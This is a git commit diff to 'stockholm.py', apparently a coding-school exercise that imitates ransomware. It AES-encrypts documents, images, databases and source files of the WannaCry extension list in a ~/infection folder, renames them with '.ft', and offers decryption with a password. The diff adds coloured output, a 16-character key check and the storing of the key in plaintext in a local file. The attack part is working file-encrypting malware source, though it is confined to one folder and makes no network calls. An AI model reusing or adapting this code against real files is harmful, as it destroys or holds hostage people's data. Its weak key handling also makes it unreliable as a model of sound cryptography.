9bc8f5983e8e0cdb39f369b199f23330fb93b557
Jaimgreg Ternero <jternero@c2r5s1.42malaga.com>
2023-05-22 18:28:45 +0200

    Stockholm

--- stockholm.py
+++ stockholm.py
@@ -3,10 +3,13 @@ import sys
 from Cryptodome.Cipher import AES
 from Cryptodome.Random import get_random_bytes
 import argparse
+from colorama import Fore, Back, Style
+
 
 VERSION = "1.0"
+KEY_FILE = "encryption_key.data"
 IV_LENGTH = 16
-KEY_LENGTH = 32
+KEY_LENGTH = 16
 BLOCK_SIZE = 16
 INFECTED_FOLDER = os.path.join(os.path.expanduser("~"), "infection")
 AFFECTED_EXTENSIONS = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.png', '.bmp', '.tif', '.dbf', '.sql', '.mdb', '.sln', '.php', '.asp', '.aspx', '.html', '.xml', '.psd']
@@ -14,11 +17,11 @@ AFFECTED_EXTENSIONS = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf'
 def encrypt_file(filename, key, silent=False):
     if filename.endswith('.ft'):
         if not silent:
-            print(f"File {filename} already encrypted.")
+            print(Fore.RED + f"File {filename} already encrypted." + Fore.RESET)
         return # Don't encrypt an already encrypted file
 
     if not any(filename.endswith(ext) for ext in AFFECTED_EXTENSIONS):
-        print(f"File {filename} not affected.")
+        print(Fore.GREEN + f"File {filename} not affected." + Fore.RESET)
         return # Don't encrypt files that aren't in the list
 
     with open(filename, 'rb') as file:
@@ -34,14 +37,14 @@ def encrypt_file(filename, key, silent=False):
         file.write(encrypted_data) # Write encrypted data to a new file
 
     if not silent: # Don't print anything if silent mode is enabled
-        print(f"Encrypted {filename}")
+        print(Fore.YELLOW + f"Encrypted {filename}" + Fore.RESET)
 
 def decrypt_file(filename, key, silent=False): # Decrypt a file
     base_filename, extension = os.path.splitext(filename)# Split the filename and extension into two variables (base_filename and extension)")
 
     if not extension == '.ft': # If the file doesn't have the .ft extension, it's not encrypted
         if not silent:
-            print(f"File {filename} is not encrypted.")
+            print(Fore.GREEN + f"File {filename} is not encrypted." + Fore.RESET)
         return
 
     with open(filename, 'rb') as file: # Open the encrypted file  in read-only mode
@@ -58,7 +61,7 @@ def decrypt_file(filename, key, silent=False): # Decrypt a file
     os.remove(filename) # Remove original file (encrypted file)
 
     if not silent:
-        print(f"Decrypted {filename}")
+        print(Fore.YELLOW + f"Decrypted {filename}" + Fore.RESET)
 
 def pad(data): # Pad data to be a multiple of 16 bytes
     padding_length = BLOCK_SIZE - (len(data) % BLOCK_SIZE) # Calculate the number of bytes that need to be padded
@@ -71,11 +74,11 @@ def unpad(data): # Remove padding from data
 
 def process_files(key, action, silent=False): # Encrypt or decrypt all files in the infected folder
     if action == "decrypt" and not os.path.exists(INFECTED_FOLDER): # If the infected folder doesn't exist, there are no infected files
-        print("No infected files found.")   
-        sys.exit(0)
+        print(Fore.YELLOW + "No infected files found." + Fore.RESET)  
+        sys.exit(0)   
 
     if not silent:
-        print(f"{action.capitalize()}ing files...")
+        print(Fore.BLUE + f"{action.capitalize()}ing files..." + Fore.RESET)
 
     for root, dirs, files in os.walk(INFECTED_FOLDER): # Walk through the infected folder
         for filename in files: # Loop through all files in the infected folder
@@ -85,6 +88,18 @@ def process_files(key, action, silent=False): # Encrypt or decrypt all files in 
                     encrypt_file(filepath, key, silent)
                 else:
                     decrypt_file(filepath, key, silent)
+                    
+def store_key(key): # Store the encryption key in a file
+    with open(KEY_FILE, "wb") as f:
+         f.write(key)
+         print(Fore.BLUE + "Encryption key stored in " + KEY_FILE + Fore.RESET)
+
+def retrieve_key():  # Retrieve the encryption key from a file
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, "rb") as f:
+            print(Fore.CYAN + "Encryption key retrieved from " + KEY_FILE + Fore.RESET)
+            return f.read()
+
 
 def main():
     parser = argparse.ArgumentParser(description='Stockholm - File Encryption/Decryption Tool')
@@ -94,20 +109,36 @@ def main():
     args = parser.parse_args()
 
     if args.v:
-        print(f"Stockholm version {VERSION}")
+        print(Fore.CYAN + f"Stockholm version {VERSION}" + Fore.RESET)
         sys.exit(0)
 
     silent = args.s
 
-    if not args.r:
-        password = input("Enter your encryption key (at least 16 characters): ")
-        key = password.encode()[:KEY_LENGTH] # Convert the password to bytes and get the first 32 bytes
-        action = "encrypt" # Set action to encrypt 
-    else: 
-        key = args.r.encode()[:KEY_LENGTH] # Convert the key to bytes and get the first 32 bytes
-        action = "decrypt" # Set action to decrypt
+    if not args.r: 
+        # Encrypt  
+        password = input(Fore.LIGHTGREEN_EX + "Enter your password: " + Fore.RESET)
+        while len(password) != 16:
+            print(Fore.RED + "Key must be 16 characters long. Try again" + Fore.RESET)    
+            password = input(Fore.LIGHTGREEN_EX + "Enter your password (at least 16 characters): " + Fore.RESET)
 
-    process_files(key, action, silent) # Encrypt or decrypt all files in the infected folder
+        key = password.encode()[:KEY_LENGTH]  
+        action = "encrypt"     
+        store_key(key)
+        
+    else:     
+        # Decrypt      
+        decryption_key = args.r.encode() 
+        
+        encryption_key = retrieve_key()
+        
+        while decryption_key != encryption_key:
+            print(Fore.LIGHTMAGENTA_EX + "Incorrect decryption key! Try again" + Fore.RESET)    
+            decryption_key = input(Fore.LIGHTGREEN_EX + "Enter your password: " + Fore.RESET).encode()
+            
+        key = decryption_key
+        action = "decrypt"
+        os.remove(KEY_FILE) # Remove the encryption key file
+    process_files(key, action, silent)
 
 if __name__ == "__main__":
     main()
